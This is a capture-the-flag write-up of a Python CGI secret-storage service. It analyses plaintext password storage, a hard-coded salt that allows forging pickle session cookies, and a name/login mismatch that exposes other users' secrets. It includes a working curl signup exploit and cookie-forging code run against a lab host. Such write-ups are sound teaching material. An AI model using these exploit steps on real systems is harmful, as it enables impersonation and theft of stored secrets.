# N4w Secrets

## Description

> Password-protected secret storage service for the web.

This service is created by the team *Noobs4Win*. It's a Python CGI website used
to store secrets for every registered users.

It's a very simple website where you can sign up (and obviously sign in later)
to then save a secret. A page allows to retrieve all saved secrets to a 
logged in user.

The different pages are accessible from `index.cgi` using the request parameter
`action`. It can be among these 5 values `default`, `signin`, `signup`,
`addsecret`, `logout`. They are pretty self-explaining, but if none is given,
`default` is chosen.

It uses a sqlite database to store the list of users, and their associated
secrets. One possible issue to notice is the way users are stored:
```python
self.__cursor.execute('INSERT INTO users (name, login, password) VALUES (?, ?, ?)', (name, login, password))
```
Their password is not digested or ciphered, what means it may be retrieved and
used to log in as the flag user.

### Flag

Flag Description:

> Flags are identified by the user name.


When you register, you must provide a login, a password and your name. The
later is thus the *flag_id*. However, the *set_flag* script use the same string
for both the login and the name.


## Vulnerabilities

As the service is relying on a sqlite database, maybe a SQL injection present.
But actually, all queries are prepared:
```python
self.__cursor.execute('SELECT * FROM users WHERE login=(?)', (login,))
self.__cursor.execute('INSERT INTO users (name, login, password) VALUES (?, ?, ?)', (name, login, password))
self.__cursor.execute('SELECT * FROM secrets WHERE name=(?)', (self.__storage['name'],))
self.__cursor.execute('INSERT INTO secrets (name, login, content) VALUES (?, ?, ?)', (self.__storage['name'], self.__storage['login'], content))
```

Thus, next step is to read the source code to try to locate vulnerabilities.
Two of them directly pop up.

### Weak crypto

This first one is located in the `Session` class in `cgiapp.py`. The class
relies on the *Pickle* module of Python to store the user's session information
inside the `session` cookie. *Pickle* is a well-known Python module use to
serialize but which brings big security issues if its input can be controlled
by the user (actually, it's possible for an attacker to execute any python
code).

```python
session = pickle.dumps(self.__sessionStorage)
checksum = sha.new(session + self.__salt).hexdigest()
session = session.encode('hex')
cookie = checksum + session
return 'Set-Cookie: session=%s;' % cookie
```

Hopefully, the session information is prepended with a salted digested
checksum. Similarly, when retrieving the session, this checksum is firstly
verified before *Pickle* loads it.

```python
session = Cookie(environ.get('HTTP_COOKIE')).get('session').value
if not session:
        raise
if len(session) < 40:
        raise
if len(session) % 2 != 0:
        raise
for c in session:
        if c not in '0123456789abcdef':
                raise
checksum, session = session[:40], session[40:].decode('hex')
if sha.new(session + salt).hexdigest() != checksum:
        raise
self.__sessionStorage = pickle.loads(session)
```

We can barely craft a fake session cookie without this salt. Let's track where
this salt come from.

```python
class Session():
	def __init__(self, salt):
		self.__salt = salt
```

```python
class Application():
	def __init__(self):
		cgitb.enable(context=100)
		self.actions = {}
		self.storage = Storage()
		self.session = Session(salt='f72f460da5376c477543ae78533892b5')
```

So the salt is hard-coded, and well known: `f72f460da5376c477543ae78533892b5`.

### Login and name mismatch

The other issue which pops up immediatly is located in the SQL queries. To
register a user, the script `user.py` first check if a user with the same
`login` is registered. If not, the user is added to the database.

```python
self.__cursor.execute('SELECT * FROM users WHERE login=(?)', (login,))
user = self.__cursor.fetchone()
# Sign up
if login and password and name:
        if user:
                raise UserAlreadyExistsException()
        self.__cursor.execute('INSERT INTO users (name, login, password) VALUES (?, ?, ?)', (name, login, password))
        self.__connection.commit()
        self.__storage = {
                'name': name,
                'login': login
        }
```

However, to retrieve the secrets, it fetches all secrets from the database
where the `name` match the user's one.

```python
self.__cursor.execute('SELECT * FROM secrets WHERE name=(?)', (self.__storage['name'],))
secrets = []
for secret in self.__cursor.fetchall():
        secrets.append(secret[2])
return secrets
```


## Proof of Concept

We know two simple vulnerabilities which can be exploited.

### Manual PoC

We'll use only the later vulnerability for this part as it's very easy to
exploit it. The *flag_id* we want to retrieve is `fbc634d0b48428b0588a`.

We only need to create a new user whose name would be the *flag_id*. Let's
use the *login* and *password* `toto` with the *name* `fbc634d0b48428b0588a`.

```bash
$ curl -X POST -d 'action=signup&login=toto&password=toto&name=fbc634d0b48428b0588a' http://192.168.56.101:20120/

<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<title>Secret storage | Profile</title>
		<link rel="stylesheet" href="http://yui.yahooapis.com/pure/0.6.0/pure-min.css">
	</head>
	<body style="width: 500px; margin: auto; padding-top: 10px;">
<form class="pure-form pure-form-stacked" method="post">
	<span style="font-size: 20px; display: inline-block;" class="pure-input-2-3">Hello, fbc634d0b48428b0588a!</span>
	<input type="hidden" name="action" value="logout">
    <button style="display: inline" type="submit" class="pure-button pure-button-danger pure-input-1-3">Logout</button>
</form>
<div style="font-size: 20px; margin-top: 20px; padding-top: 20px; border-top: 1px solid #eee;">
    You can add some secrets:
</div>

<form class="pure-form pure-form-stacked" method="post">
    <fieldset>
        <textarea placeholder="Secret content" class="pure-input-1" name="content"></textarea>
        <input type="hidden" name="action" value="addsecret">
        <button type="submit" class="pure-button pure-button-primary pure-input-1-3">Add</button>
    </fieldset>
</form>
<div style="font-size: 20px; margin-top: 20px; border-bottom: 1px solid #eee;"></div>
<div style="font-size: 20px; margin-top: 20px;">
    Your secrets:
</div>
<p class="content">FLGeH0dcR2MBfdEE</p>
	</body>
</html>
```

The response includes one very interesting thing at the end:
```html
<p class="content">FLGeH0dcR2MBfdEE</p>
```

As a picture worth thousand words, here is the response in a browser:

![Page with a flag][flag_page]


### Automated PoC

The script [poc_name.py][poc_name] use the same principle as previously to get
the flag, so it won't be explained again.

The script [poc_pickle.py][poc_pic], use the first vulnerability on weak
crypto. We first craft a fake cookie, using the hard-coded salt, to impersonate
the user of the *flag*. 

```python
session = pickle.dumps({'login': flag_id, 'name': flag_id})
checksum = sha.new(session + _SALT_).hexdigest()
session = session.encode('hex')
cookie = checksum + session
```

Then we only need to ask for the default page to retrieve the flag.

```bash
$ ./poc_name.py 192.168.56.101 20120 84bbed828259cbe9d273
FLG0kJFsFPI8Uxml
```

```bash
$ ./poc_pickle.py 192.168.56.101 20120 84bbed828259cbe9d273
FLG0kJFsFPI8Uxml
```


[poc_name]: poc_name.py
[poc_pic]: poc_pickle.py
[flag_page]: assets/flag_page.png
